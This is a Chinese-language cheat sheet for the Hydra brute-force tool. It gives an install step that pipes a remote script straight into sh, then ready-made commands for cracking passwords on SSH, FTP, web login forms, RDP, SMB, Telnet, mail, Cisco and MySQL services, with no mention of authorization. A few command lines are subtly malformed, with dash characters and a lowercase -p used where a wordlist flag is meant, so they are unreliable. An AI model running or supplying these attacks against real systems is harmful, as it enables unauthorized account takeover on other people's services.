***hydra简介***

  

  

    这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典是否足够强大。对于社会工程型渗透来说，有时能够得到事半功倍的效果。

  

  

***安装方式***

  

  

windows:

https://github.com/vanhauser-thc/thc-hydra

Linux:

wget -q -O - http://www.atomicorp.com/installers/atomic | sh

yum install hydra

***案例***

  

  

  

**01**

NEWS

**破解SSH**

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh

hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh

**02**

NEWS

**破解FTP**

hydra ftp://ip -l 用户名 -P 密码字典 -t 线程(默认16) -vV

hydra ftp://ip -l 用户名 -P 密码字典 -e ns -vV

**03**

NEWS

**破解web登录，get方式**

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php

**04**

NEWS

**破解web登录，post方式**

hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"

  

hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:wrong username or password"

  

（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）

  

**05**

NEWS

**破解https**

hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

**06**

NEWS

**破解语音通讯工具teamspeak**

hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

**07**

NEWS

**破解cisco**

hydra -P 密码字典 IP地址 cisco

  

hydra -m cloud -P 密码字典 IP地址 cisco-enable

**08**

NEWS

**破解smb**

hydra -l 用户名字典 -P 密码字典 IP地址 smb

**09**

NEWS

**破解邮箱pop3**

hydra -l 用户名 -P 密码字典.txt my.pop3.mail pop3

**10**

NEWS

**破解rdp（远程桌面）**

hydra ip rdp -l administrator -P 密码字典.txt -V

**11**

NEWS

**破解http-proxy**

hydra -l admin -P 密码字典.txt http-proxy://IP地址

**12**

NEWS

**破解telnet**

hydra IP地址 telnet -l 用户字典.txt -P 密码字典.txt -t 32 -s 23 -e ns -f -V

**13**

NEWS

**破解imap**

hydra -L 用户名字典.txt -p secret IP地址 imap PLAIN

  

hydra -C defaults.txt -6 imap://\[fe80::2c:31ff:fe12:ac11\]:143/PLAIN

  

**14**

NEWS

**破解mysql**

hydra  -l root –P 密码字典.txt –e ns IP地址 mysql
